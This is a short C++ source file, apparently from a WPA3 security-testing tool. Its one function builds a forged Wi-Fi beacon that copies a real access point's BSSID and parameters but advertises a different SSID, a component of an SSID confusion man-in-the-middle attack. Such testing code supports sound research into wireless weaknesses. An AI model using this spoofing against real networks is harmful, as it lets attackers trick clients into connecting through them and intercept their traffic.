#include "attacks/mc_mitm/client_state.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"

namespace wpa3_tester::ssid_confusion {
using namespace Tins;
using namespace std;

unique_ptr<Dot11Beacon> SsidConfusion::make_confused_beacon(const Dot11Beacon &real, const string &confused_ssid) {
	// BSSID kept identical to real AP
	auto b = Dot11Beacon(real.addr1(), real.addr2());
	b.addr3(real.addr3());
	b.timestamp(real.timestamp());
	b.interval(real.interval());
	b.capabilities() = real.capabilities();

	for(const auto &opt: real.options()) {
		if(opt.option() == Dot11::SSID) {
			b.add_option({ Dot11::SSID,
				static_cast<uint8_t>(confused_ssid.size()),
				reinterpret_cast<const uint8_t *>(confused_ssid.data()) });
		} else {
			b.add_option(opt);
		}
	}
	return std::make_unique<Dot11Beacon>(std::move(b));
}

}
